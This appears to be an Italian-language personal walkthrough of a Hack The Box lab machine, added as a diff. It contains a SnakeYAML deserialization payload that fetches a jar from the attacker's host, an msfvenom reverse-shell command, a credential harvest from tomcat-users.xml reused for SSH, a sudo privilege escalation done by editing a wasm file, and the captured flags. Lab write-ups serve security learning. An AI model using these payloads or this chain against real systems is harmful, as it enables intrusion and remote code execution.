@@ -1,0 +1,428 @@
+10.10.10.227
+
+
+sudo masscan -p1-65535 --rate 1000 --banners --open -e tun0 10.10.10.227                                                                                                                  130 ⨯
+Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-12-18 19:10:36 GMT
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 22/tcp on 10.10.10.227
+Discovered open port 8080/tcp on 10.10.10.227
+
+
+nmap -sC -sV -Pn -p- 10.10.10.227                                                                          130 ⨯
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-18 20:11 CET
+Nmap scan report for 10.10.10.227
+Host is up (0.33s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
+|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
+|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
+8080/tcp open  http    Apache Tomcat 9.0.38
+|_http-title: Parse YAML
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+controllo la porta 8080
+
+c'è un "online yaml parser"
+
+<form action="Servlet" method="post">
+            <textarea type="text" id="data" class="fadeIn second" name="data" placeholder="" rows="7" cols="30"></textarea>
+
+            <input type="submit" class="fadeIn fourth" value="Parse">
+        </form>
+
+form action = Servlet quindi il backend è fatto in java
+
+se provo a fare il parse di qualcosa ottengo una pagina con:
+
+Due to security reason this feature has been temporarily on hold. We will soon fix the issue!
+
+posso provare con burp a vedere se mettendo GET/POST al posto di quello che c'è riesco ad ottenere qualcosa
+e con dirb per vedere se ci sono altri pathc he posso attaccare
+
+e infatti mettengo GET al posto di POST ottengo 200 OK
+anche se non mi restituisce nulla
+
+questo vuol dire che quantomeno anche GET è implementato
+
+
+inoltre potrebbe essere anche che l'input viene comunque processato, se c'è qualche errore di programmazione
+
+https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#snakeyaml-yaml
+
+
+
++ http://10.10.10.227:8080/host-manager (CODE:302|SIZE:0)
++ http://10.10.10.227:8080/manager (CODE:302|SIZE:0)
++ http://10.10.10.227:8080/Servlet (CODE:200|SIZE:0)
++ http://10.10.10.227:8080/test (CODE:302|SIZE:0)
+
+
+se contatto Servlet senza mandare nulla nel body (richiede il parametro data=) ottengo un'eccezione e lo stacktrace:
+
+java.lang.NullPointerException
+	java.base&#47;java.io.StringReader.&lt;init&gt;(StringReader.java:50)
+	org.yaml.snakeyaml.reader.StreamReader.&lt;init&gt;(StreamReader.java:63)
+	org.yaml.snakeyaml.Yaml.load(Yaml.java:416)
+	Servlet.doPost(Servlet.java:15)
+	javax.servlet.http.HttpServlet.service(HttpServlet.java:652)
+	javax.servlet.http.HttpServlet.service(HttpServlet.java:733)
+	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
+
+
+quindi la libreria usata è snakeyaml e a quanto pare la stringa in input gli viene passata comunque quindi posso sfruttare eventuali bug
+
+
+
+
+l'exploit è molto semplice:
+
+https://rioasmara.com/2021/07/13/snake-yaml-for-reverse-shell/
+
+genero il payload:
+
+msfvenom --platform java -f jar -p java/meterpreter/reverse_tcp LHOST=10.10.16.5 LPORT=4444 -o exploit.jar
+
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://10.10.16.5:9999/exploit.jar"]
+  ]]
+]
+
+
+effettivamente cerca di prendere il jar dal server python:
+
+10.10.10.227 - - [18/Dec/2021 21:26:19] "GET /exploit.jar HTTP/1.1" 200 -
+
+anche se non ricevo la reverse shell
+
+forse con meterpreter non funziona provo a scrivere una reverse shell in un file java e a compilare il jar: (java_rev_shell.java)
+
+compilo in jar:
+
+javac src/artsploit/AwesomeScriptEngineFactory.java
+jar -cvf yaml-payload.jar -C src/ .
+
+
+10.10.10.227 - - [19/Dec/2021 18:33:41] "GET /yaml-payload.jar HTTP/1.1" 200 -
+10.10.10.227 - - [19/Dec/2021 18:33:41] "GET /yaml-payload.jar HTTP/1.1" 200 -
+10.10.10.227 - - [19/Dec/2021 18:33:42] "GET /revshell.sh HTTP/1.1" 200 -
+
+
+
+ottengo la reverse shell
+
+$ whoami
+whoami
+tomcat
+
+
+$ cat /home/admin/user.txt
+cat /home/admin/user.txt
+cat: /home/admin/user.txt: Permission denied
+
+
+mi servirà una doppia privesc
+
+
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+tomcat:x:1001:1001::/opt/tomcat:/bin/false
+admin:x:1000:1000:,,,:/home/admin:/bin/bash
+
+
+
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
+tcp        0     13 10.10.10.227:47540      10.10.16.5:4444         ESTABLISHED
+tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN
+tcp6       0      0 :::8080                 :::*                    LISTEN
+tcp6       0      0 :::22                   :::*                    LISTEN
+udp        0      0 127.0.0.53:53           0.0.0.0:*
+
+
+
+
+sotto /opt/ c'è la dir di tomcat e anche di wasmer:
+
+drwxr-xr-x  9 root tomcat 4096 Oct 11  2020 tomcat
+drwxr-xr-x  5 root root   4096 Oct 14  2020 .
+drwxr-xr-x  9 root root   4096 Oct 14  2020 wasmer-go
+drwxr-xr-x  3 root root   4096 Oct 14  2020 wasm-functions
+drwxr-xr-x 20 root root   4096 Feb  5  2021 ..
+
+
+
+in tomcat trovo tutto il sito, provo a scaricare yaml.war per capire se c'è altro che si può sfruttare
+
+non sembra esserci altro (ho aperto Servlet.class con jd-gui)
+
+provo allora a scaricare Servlet.class della pagina test che avevo trovato con dirb ma non mi dava nessun risultato quando la raggiungev
+tra l'altro ho trovato vari files in giro chiamati test.txt con scritto "it works"
+
+potrebbero essere file sgenerati da questa servlet
+
+la scarico come Servlet_test.class e la apro sempre con jd-gui
+
+niente di interessante quindi continuo ad enumerare
+
+
+$ pwd
+/opt/tomcat
+$ grep -l8ri "password" ./
+
+$ cat ./conf/tomcat-users.xml | grep password
+<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
+  you must define such a user - the username and password are arbitrary. It is
+  them. You will also need to set the passwords to something appropriate.
+  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
+  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
+  <user username="role1" password="<must-be-changed>" roles="role1"/>
+
+
+Ottengo le credenziali per l'utente admin:
+
+admin:whythereisalimit
+
+
+potrebbero essere riutilizzate anche per ssh ? si perchè riesco a collegarmi:
+
+admin@ophiuchi:~$ id
+uid=1000(admin) gid=1000(admin) groups=1000(admin)
+
+admin@ophiuchi:~$ cat user.txt
+b02bde7fdfdcec79b0662517e570acdc
+
+
+
+admin@ophiuchi:~$ sudo -l
+Matching Defaults entries for admin on ophiuchi:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User admin may run the following commands on ophiuchi:
+    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
+
+
+
+quindi posso fare go run index.go di wasm
+
+
+
+index.go:
+
+
+package main
+
+import (
+	"fmt"
+	wasm "github.com/wasmerio/wasmer-go/wasmer"
+	"os/exec"
+	"log"
+)
+
+
+func main() {
+	bytes, _ := wasm.ReadBytes("main.wasm")
+
+	instance, _ := wasm.NewInstance(bytes)
+	defer instance.Close()
+	init := instance.Exports["info"]
+	result,_ := init()
+	f := result.String()
+	if (f != "1") {
+		fmt.Println("Not ready to deploy")
+	} else {
+		fmt.Println("Ready to deploy")
+		out, err := exec.Command("/bin/sh", "deploy.sh").Output()
+		if err != nil {
+			log.Fatal(err)
+		}
+		fmt.Println(string(out))
+	}
+}
+
+
+a quanto pare carica le funzioni in main.wasm e ne fa il deploy
+
+(/bin/sh deploy.sh)
+
+
+admin@ophiuchi:/opt/wasm-functions$ cat deploy.sh
+#!/bin/bash
+
+# ToDo
+# Create script to automatic deploy our new web at tomcat port 8080
+
+dmin@ophiuchi:/opt/wasm-functions$ /usr/bin/go run /opt/wasm-functions/index.go
+index.go:5:2: cannot find package "github.com/wasmerio/wasmer-go/wasmer" in any of:
+	/usr/lib/go-1.13/src/github.com/wasmerio/wasmer-go/wasmer (from $GOROOT)
+	/home/admin/go/src/github.com/wasmerio/wasmer-go/wasmer (from $GOPATH)
+admin@ophiuchi:/opt/wasm-functions$ sudo /usr/bin/go run /opt/wasm-functions/index.go
+Not ready to deploy
+
+se lo eseguo mi da solo not ready to deploy, quindi la aprte di esecuzione di deploy.sh non verrebbe fatta comunque (?)
+
+però cerca di caricare wasm (wasm "github.com/wasmerio/wasmer-go/wasmer")
+e poi ne esegue delle funzioni:
+
+bytes, _ := wasm.ReadBytes("main.wasm")
+
+
+prima cerca di caricarlo da
+
+/usr/lib/go-1.13/src/github.com/wasmerio/wasmer-go/wasmer
+
+che non esiste, se ho la possibilità di creare il file che cerca posso fargli eseguire un mio file scritto in go al posto del file effettivo che cerca
+
+
+
+posso però creare sotto /home/admin/go/src/github.com/wasmerio/wasmer-go/wasmer
+
+e infatti rieseguendo con sudo ottengo:
+
+
+sudo /usr/bin/go run /opt/wasm-functions/index.go
+panic: runtime error: index out of range [0] with length 0
+
+goroutine 1 [running]:
+github.com/wasmerio/wasmer-go/wasmer.NewInstanceWithImports.func1(0x0, 0x0, 0xc000040c90, 0x5d1200, 0x200000003)
+	/root/go/src/github.com/wasmerio/wasmer-go/wasmer/instance.go:94 +0x201
+github.com/wasmerio/wasmer-go/wasmer.newInstanceWithImports(0xc000086020, 0xc000040d48, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc000040d70)
+	/root/go/src/github.com/wasmerio/wasmer-go/wasmer/instance.go:137 +0x1d3
+github.com/wasmerio/wasmer-go/wasmer.NewInstanceWithImports(0x0, 0x0, 0x0, 0xc000086020, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4e6180, ...)
+	/root/go/src/github.com/wasmerio/wasmer-go/wasmer/instance.go:87 +0xa6
+github.com/wasmerio/wasmer-go/wasmer.NewInstance(0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4e6180, 0x1)
+	/root/go/src/github.com/wasmerio/wasmer-go/wasmer/instance.go:82 +0xc9
+main.main()
+	/opt/wasm-functions/index.go:14 +0x6d
+exit status 2
+admin@ophiuch
+
+
+prima non era andato in errore
+
+quindi ora se riesco a rendere caricabile questo file e a mettere del codice nel metodo che chiama riesco ad eseguire i comandi che voglio
+
+
+il problema però è comunque sta cercando di prendersi il path  /root/go/src/github.com/wasmerio/wasmer-go/wasmer/
+
+a cui non ho accesso
+
+
+infatti anche se cancello i file che ho creato comunque non funziona
+
+
+
+
+funziona solo se mi metto nella directory /opt/wasm-functions/ dove c'è main.wasm
+altrimenti NON LO TROVA
+
+quindi vuol dire che quando fa operazioni tipo:
+
+bytes, _ := wasm.ReadBytes("main.wasm")
+
+va a cercare i file nella directory da cui viene lanciato il comando,, non nella directory in cui si trova index.go
+
+quindi in teoria posso semplicemente ricrearmi main.wasm e deploy.sh in un altra dir su cui ho permessi di scrittura e creare files e lanciare il comando da la
+
+l'unico problema che anbcora rimane è che se eseguo il comando con questo main.wasm ottengo:
+
+Not ready to deploy
+
+e quindi lo script non verrebbe mai eseguito, però visto che già devo copiare il file main.wasm posso cercare di capire anche come modificarlo in modo tale da ottenere il valore della variabile f adatto
+e quindi nello script index.go far partire deploy.sh
+
+posso provare ad usare https://github.com/WebAssembly/wabt
+
+
+(module
+  (type (;0;) (func (result i32)))
+  (func $info (type 0) (result i32)
+    i32.const 0)
+  (table (;0;) 1 1 funcref)
+  (memory (;0;) 16)
+  (global (;0;) (mut i32) (i32.const 1048576))
+  (global (;1;) i32 (i32.const 1048576))
+  (global (;2;) i32 (i32.const 1048576))
+  (export "memory" (memory 0))
+  (export "info" (func $info))
+  (export "__data_end" (global 1))
+  (export "__heap_base" (global 2)))
+
+
+  la funzione info() ritorna 0 alla riga 4 quindi lo cambio per far ritornare 1:
+
+
+
+  (module
+    (type (;0;) (func (result i32)))
+    (func $info (type 0) (result i32)
+      i32.const 1)
+    (table (;0;) 1 1 funcref)
+    (memory (;0;) 16)
+    (global (;0;) (mut i32) (i32.const 1048576))
+    (global (;1;) i32 (i32.const 1048576))
+    (global (;2;) i32 (i32.const 1048576))
+    (export "memory" (memory 0))
+    (export "info" (func $info))
+    (export "__data_end" (global 1))
+    (export "__heap_base" (global 2)))
+
+
+    ottengo main0.wasm
+
+    lo metto nella home di admin dove ho messo anche deploy.sh e da dove lancio il comando, se tutto è andato bene dovrebbe dirmi "readuy to deploy"
+
+
+    min@ophiuchi:~$ mv main.wasm main.wasm_bk
+    admin@ophiuchi:~$ mv main0.wasm main.wasm
+    admin@ophiuchi:~$ chmod 755 main.wasm
+    admin@ophiuchi:~$ sudo /usr/bin/go run /opt/wasm-functions/index.go
+    Ready to deploy
+
+
+ora devo solo modificare il file .sh
+
+
+
+ci ho messo solo cat 7root/root.txt perfare presto ma avrei potuto ottenre una reverse shell senza problemi
+
+
+3be77292799e94b557f8b6b1bc9199c4
